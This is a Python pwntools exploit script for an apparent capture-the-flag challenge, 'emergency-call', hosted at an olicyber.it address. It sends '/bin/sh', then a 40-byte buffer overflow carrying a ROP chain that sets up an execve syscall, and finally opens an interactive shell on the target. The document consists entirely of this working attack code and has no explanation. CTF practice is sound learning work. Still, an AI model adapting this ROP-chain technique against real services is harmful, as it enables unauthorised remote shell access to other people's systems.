from pwn import *

elf = context.binary = ELF('./emergency-call')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("emergency.challs.olicyber.it", 10306)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    ''')
else:
    conn = elf.process()
    
POP_RDI = 0x401032
POP_RSI = 0x401034
POP_RDX = 0x401036
XOR_RAX_RDI = 0x401038
SYSCAL = 0x40101a
payload = flat([
    POP_RDI,
    0x3b,
    XOR_RAX_RDI,
    POP_RDI,
    0x404000,
    POP_RSI,
    0,
    POP_RDX, 
    0,
    SYSCAL
    ])
conn.recvline(b"?")
conn.send(b"/bin/sh\x00")
conn.recvline(b"?")
conn.send(b"A"*40 + payload)
conn.interactive()